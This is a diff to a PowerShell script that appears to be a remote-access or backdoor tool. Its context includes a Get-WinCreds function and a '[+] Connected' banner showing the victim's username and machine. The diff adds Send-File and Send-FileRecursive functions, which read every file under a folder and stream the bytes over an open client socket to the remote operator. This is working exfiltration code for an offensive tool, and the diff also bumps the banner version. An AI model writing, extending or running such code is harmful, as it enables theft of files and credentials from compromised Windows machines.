@@ -390,6 +390,40 @@ function PortSuggest {
 
 
 
+function Send-File {
+    param (
+        [string]$FilePath,
+        [string]$RemoteName = $(Split-Path $FilePath -Leaf)
+    )
+
+    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
+    $clientStream.WriteLine("!file $RemoteName $($bytes.Length)")
+    $clientStream.Write($bytes, 0, $bytes.Length)
+    $clientStream.Flush()
+}
+
+function Send-FileRecursive {
+    param (
+        [string]$FolderPath
+    )
+
+    if (!(Test-Path $FolderPath)) {
+        Write-Host "[ERROR] Папка не найдена: $FolderPath"
+        return
+    }
+
+    # Получаем список файлов
+    $files = Get-ChildItem -Path $FolderPath -Recurse -File
+    foreach ($file in $files) {
+        try {
+            $relativePath = $file.FullName.Substring($FolderPath.Length + 1)
+            Write-Host "[INFO] Отправка: $relativePath"
+            Send-File $file.FullName $relativePath
+        } catch {
+            Write-Host "[ERROR] Ошибка при отправке файла $($file.FullName): $_"
+        }
+    }
+}
 
 
 
@@ -625,13 +659,6 @@ function Get-WinCreds {
 
 
 
-
-
-
-
-
-
-
     function Tree-List {
     try {
         return Get-ChildItem -Path $currentDir -Recurse -ErrorAction SilentlyContinue |
@@ -721,7 +748,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            GO AROUND                                                                                                                                                                    
+                                            GO AROUND 2                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
